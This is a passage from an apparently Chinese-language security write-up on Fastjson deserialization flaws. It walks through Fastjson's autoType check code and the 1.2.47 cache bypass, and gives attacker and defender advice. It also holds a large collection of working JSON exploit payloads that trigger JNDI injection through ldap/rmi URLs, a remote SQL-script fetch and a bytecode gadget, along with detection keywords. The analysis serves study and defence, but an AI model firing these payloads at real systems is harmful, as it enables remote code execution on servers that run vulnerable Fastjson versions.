        long hash = h3;
        for (int i = 3; i < className.length(); ++i) {
            hash ^= className.charAt(i);
            hash *= PRIME;
            if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                if (clazz != null) {
                    return clazz;
                }
            }
            if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    if (clazz == null) {
        clazz = TypeUtils.getClassFromMapping(typeName);
    }

    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }

    if (clazz != null) {
        if (expectClass != null
                && clazz != java.util.HashMap.class
                && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }

        return clazz;
    }

    if (!autoTypeSupport) {
        long hash = h3;
        for (int i = 3; i < className.length(); ++i) {
            char c = className.charAt(i);
            hash ^= c;
            hash *= PRIME;

            if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
                throw new JSONException("autoType is not support. " + typeName);
            }

            if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                if (clazz == null) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                }

                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }

                return clazz;
            }
        }
    }

    if (clazz == null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
    }

    if (clazz != null) {
        if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) {
            return clazz;
        }

        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                ) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }

        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
        if (beanInfo.creatorConstructor != null && autoTypeSupport) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }

    final int mask = Feature.SupportAutoType.mask;
    boolean autoTypeSupport = this.autoTypeSupport
            || (features & mask) != 0
            || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;

    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    return clazz;
}
```

由于autoType没开启，所以不会进入 `if (autoTypeSupport || expectClass != null)` 分支进行白加黑的判断。紧接着，进入如下分支，从缓存中拿Class：

```java
if (clazz == null) {
    clazz = TypeUtils.getClassFromMapping(typeName);
}
```

最后从这个分支返回Class（从如下代码中看出，不能存在expectClass）：

```java
if (clazz != null) {
    if (expectClass != null
            && clazz != java.util.HashMap.class
            && !expectClass.isAssignableFrom(clazz)) {
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }

    return clazz;
}
```

总结下利用方式：

- 第一步，先想办法将 `JdbcRowSetImpl` 加入缓存；
- 第二步，在未开启autoType的情况下，直接从缓存中拿取 `JdbcRowSetImpl` ，不用经过白加黑的验证;

而payload中，第一个@type的反序列化，将使用 `MiscCodec` 反序列化器，最终在如下位置加载var对应的Class（在 `TypeUtils.loadClass` 中会将加载后的Class放入缓存）：

![image-20210805152928005](/media/image-20210805152928005.png)

后续进行第二个@type的反序列化时，将直接从缓存中拿Class，不经过白加黑检测：

![image-20210805153540117](/media/image-20210805153540117.png)

### 1.2.48 <= Version <= 1.2.68

在1.2.48中，对1.2.47进行了修复，使用 `MiscCodec` 反序列化器调用 `TypeUtils.loadClass` 加载类时，将cache设置为false，这样就不会将加载的恶意类放入缓存了：

![image-20210805154206390](/media/image-20210805154206390.png)

然后这个版本区间内的payload主要又是一些黑名单绕过以及补丁中的黑名单新增。

### Version 1.2.68

1.2.68版本引入了safemode（默认关闭），打开safemode后，@type就不起作用了。所以也就没法绕了。开启safeMode的方法如下：

```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

到了这个版本，基本上已知的 `JNDI gadget` 都已经进了黑名单，还不允许反序列化类实现了 ClassLoader、DataSource、RowSet 接口，这就导致了绝大部分的 `JNDI gadget` 无法利用。

不过还是有一些偏门的Gadget可以JNDI，需要开启autoType（感觉除了hadoop外，都有点偏门）：

```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}

{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

然后这篇文章提出一种写文件的Gadget（无具体Payload）：

[https://cloud.tencent.com/developer/article/1642365](https://cloud.tencent.com/developer/article/1642365)

可以抛砖引玉学习下。

## 总结

站在攻击者角度，碰到Fastjson可以按照如下思路进行攻击：

优先使用如下Payload进行攻击，因为这个Payload在1.2.48之前，无需开启autoType即可攻击（准确点应该是不能开启autoType）：

```json
{"test1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"test2":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Object","autoCommit":true}}
```

对于如果上述Payload攻击不成功，则基本上判断靶机为1.2.48版本以上的了，那么就把已知的常用的Payload都打一遍叭（ `JdbcRowSetImpl` 和 `TemplatesImpl` 就不用试了...早就黑名单里了 ）~

站在防御者角度，项目内存在Fastjson，如何防御？

最好还是换了叭......不要用Fastjson了......

换不了的话。如果不需要用@type特性，就直接升级新版本开启safeMode，不要开启autoType。或者项目内不要使用 `JSON.parse(String)` ，统一使用 `JSON.parseObject(String, Class)` 也可以防御（前面分析过原因，在返回Class之前，会进行类型比较，不通过直接抛出异常）。

## 流量特征

先汇总下目前在野的Payload：

```json
// 低版本常用Payload
{"test":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:8080/Shell","autoCommit":true}}

{"test":{"@type":"org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName":"ldap://localhost:1389/test","propertyPath":"foo","beanFactory":{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["ldap://localhost:1389/test"]}}}

{"rand1":Set[{"@type":"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor","beanFactory":{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["ldap://localhost:1389/test"]},"adviceBeanName":"ldap://localhost:1389/test"},{"@type":"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"}]}

{"test":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["Your Eval Class Bytecodes"],"_name":"p1n93r","_tfactory":{},"_outputProperties":{}}}

{"rand1":{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://localhost:1389/test","loginTimeout":0}}

// 高版本常用Payload
{"test1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"test2":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Object","autoCommit":true}}

{"test":{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://127.0.0.1:1072/Shell"}}

{"test":{"@type":"ch.qos.logback.core.db.DriverManagerConnectionSource","url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8080/inject.sql'"}}

{"test":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://localhost:1389/test"}}

{"test": {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/test"], "Realms":[""]}}

{"test": {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://localhost:1389/test"}}

{"test": {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://localhost:1389/test"}}}

{"test":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/test"}}}

{"test":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/test"}}}

{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"ldap://127.0.0.1:1072/Exploit1"}

{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://127.0.0.1:1072/Exploit1"}

// 以下Payload比较偏门
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}

{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

一个很明显的流量特征，就是存在@type，这个@type特性正常业务用的很少（但是我也碰到过=-='''），所以需要精准的判断攻击流量的话，可以在@type特征的基础上，再判断是否存在 `ldap` 、 `rmi` 、 `http` 等关键字（因为一般都是转换成JNDI注入了，需要特别关注下JNDI注入的关键字）。此外，还可以把在野Payload的关键字都加上黑名单。


## 参考

- [https://paper.seebug.org/636/#2-getoutputproperties](https://paper.seebug.org/636/#2-getoutputproperties)
- [https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/](https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/)
- [https://paper.seebug.org/994/](https://paper.seebug.org/994/)
- [https://kumamon.fun/FastJson-checkAutoType/](https://kumamon.fun/FastJson-checkAutoType/)

[p1]:/media/2021-08-02-01.png
[p2]:/media/2021-08-02-02.png
[p3]:/media/2021-08-02-03.png
[p4]:/media/2021-08-02-04.png
[p5]:/media/2021-08-02-05.png










